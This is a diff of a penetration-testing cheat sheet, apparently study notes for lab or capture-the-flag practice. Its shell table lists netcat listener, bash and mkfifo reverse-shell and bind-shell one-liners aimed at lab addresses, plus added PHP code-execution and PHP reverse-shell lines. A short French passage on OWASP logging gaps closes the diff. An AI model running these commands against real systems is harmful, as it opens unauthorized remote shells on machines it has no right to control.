@@ -40,10 +40,12 @@
 ### Using Shells
 | Description        | Command      |
 | ------ | ----- |
+| Test php code execution | `` <?php system('id'); ?> `` |
 | Start a nc listener on a local port | `` nc -lvnp 1234 `` |
 | Send a reverse shell from the remote server | `` bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1' `` |
-| Another command to send a reverse shell from the remote server | `` rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f `` |
-| Start a bind shell on the remote server | `` rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f `` |
+| Another command to send a reverse shell from the remote server | `` rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f `` |
+| Start a bind shell on the remote server | `` rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1 \| nc -lvp 1234 >/tmp/f `` |
+| Start a reverse shell from php | `` <?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1\|nc 10.10.14.2 9443 >/tmp/f"); ?> `` |
 | Connect to a bind shell started on the remote server | `` nc 10.10.10.1 1234	 `` |
 | Upgrade shell TTY (1) | ``python -c 'import pty; pty.spawn("/bin/bash")' `` |
 | Upgrade shell TTY (2) | `` ctrl+z then stty raw -echo then fg then enter twice `` |
@@ -147,4 +149,3 @@ Tous les composants utilisés par une application (bibliothèques, frameworks, m
 
 **- Insufficient Logging & monitoring:**
 Des lacunes dans la journalisation et la surveillance peuvent permettre à une attaque réussie de passer inaperçue, aux attaquants d'établir la persistance dans le réseau, ou de falsifier ou d'extraire des données sensibles sans se faire remarquer.
-
